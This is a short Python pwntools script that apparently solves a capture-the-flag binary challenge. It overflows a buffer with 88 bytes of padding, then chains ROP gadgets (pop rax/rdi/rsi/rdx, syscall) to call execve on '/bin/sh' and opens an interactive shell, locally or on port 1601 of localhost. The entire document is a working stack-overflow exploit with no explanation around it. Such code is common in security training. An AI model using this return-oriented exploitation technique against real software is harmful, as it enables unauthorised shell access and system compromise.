from pwn import *

exe = ELF("../challenge/chall")

context.binary = exe

PAD = 88

if args.REMOTE:
    io = remote('localhost', 1601)
else:
    io = exe.process()
#io = gdb.debug(exe.path)

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
pop_rsi = rop.find_gadget(['pop rsi','ret']).address
pop_rdx = rop.find_gadget(['pop rdx','ret']).address
pop_rax = rop.find_gadget(['pop rax','ret']).address
ret = rop.find_gadget(['ret']).address
syscall = rop.find_gadget(["syscall"]).address

print(f"pop rdi:{pop_rdi}\npop rsi: {pop_rsi}\npop rdx: {pop_rdx}\npop rax: {pop_rax}")


bin_sh = 0x402010

payload = flat (
    PAD*b'A' ,
    pop_rax,
    59,
    pop_rdi,
    bin_sh,
    pop_rsi,
    0 ,
    pop_rdx,
    0 ,
    syscall,
    ret
)
io.recv()
io.send(payload)
io.recv()
io.interactive()
